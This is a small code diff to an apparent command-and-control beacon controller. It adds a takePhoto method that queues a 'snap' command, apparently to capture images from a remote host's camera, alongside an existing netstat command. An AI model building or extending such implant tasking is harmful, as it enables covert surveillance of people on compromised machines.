@@ -80,6 +80,10 @@ class BeaconCommandsClass:
     def netstat(self, userID) -> None:
         add_beacon_command_list(userID, "netstat", "")
         return
+    
+    def takePhoto(self, userID) -> None:
+        add_beacon_command_list(userID, "snap", "")
+        return
 
     def list_db_commands(self, userID) -> None:
         for j in range(len(beacon_commands["beacon_uuid"])):
